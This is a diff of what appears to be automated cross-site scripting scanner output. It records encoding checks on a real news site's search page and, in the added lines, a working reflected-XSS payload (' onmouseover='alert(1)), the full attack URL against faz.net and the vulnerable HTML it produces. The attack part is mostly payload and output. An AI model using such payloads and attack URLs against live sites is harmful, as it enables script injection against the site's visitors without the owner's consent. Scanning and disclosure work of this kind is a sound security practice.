@@ -44,39 +44,49 @@ URI Context: [2]
 ----------------------------------------------------------------------------------
 
 
-	Attr-Single	Encapsulated With Double Quotes: Can't Break the Context
-Mitigation        "	'	<	( 
-ATTR:		True	True	False	False
+ENCODING        "	'	<	( 
+ATTR:		True	False	False	False
 
 Attack Payloads for ATTR
-[]
-	Attr-Single	Encapsulated With Double Quotes: Can't Break the Context
-Mitigation        "	'	<	( 
-ATTR:		True	True	True	False
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.faz.net/suche/?query=' onmouseover='alert(1)&resultsPerPage=20
+
+=> Successful with Payload: ' onmouseover='alert(1)
+FINAL OUTPUT: 
+<div class="js-adobe-digital-data is-Invisible" data-digital-data='{"site":{"digitalAsset":"faz.net"},"internalSearch":{"term":"' onmouseover='alert(1)","numberOfResults":0},"page":{"name":"2.2064","ressort":"Suche","type":"suche","title":"Suche","seoTitle":"Suche und Suchergebnisse - FAZ"}}'>
+ENCODING        "	'	<	( 
+ATTR:		True	False	True	False
 
 Attack Payloads for ATTR
-[]
-Mitigation        "	'	<	( 
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.faz.net/suche/?query=' onmouseover='alert(1)&resultsPerPage=20
+
+=> Successful with Payload: ' onmouseover='alert(1)
+FINAL OUTPUT: 
+<div class="js-adobe-digital-data is-Invisible" data-digital-data='{"site":{"digitalAsset":"faz.net"},"internalSearch":{"term":"' onmouseover='alert(1)","numberOfResults":0},"page":{"name":"2.2064","ressort":"Suche","type":"suche","title":"Suche","seoTitle":"Suche und Suchergebnisse - FAZ"}}'>
+ENCODING        "	'	<	( 
 HTML:		True	False	True	False
 
 Attack Payloads for HTML
 []
-Mitigation        "	'	<	( 
+ENCODING        "	'	<	( 
 HTML:		True	False	True	False
 
 Attack Payloads for HTML
 []
-Mitigation        "	'	<	( 
+ENCODING        "	'	<	( 
 SCRIPT:		True	True	True	False
 
 Attack Payloads for SCRIPT
 []
-Mitigation        "	'	<	( 
+ENCODING        "	'	<	( 
 URL:		True	True	True	True
 
 Attack Payloads for URL
 []
-Mitigation        "	'	<	( 
+ENCODING        "	'	<	( 
 URL:		True	True	True	True
 
 Attack Payloads for URL
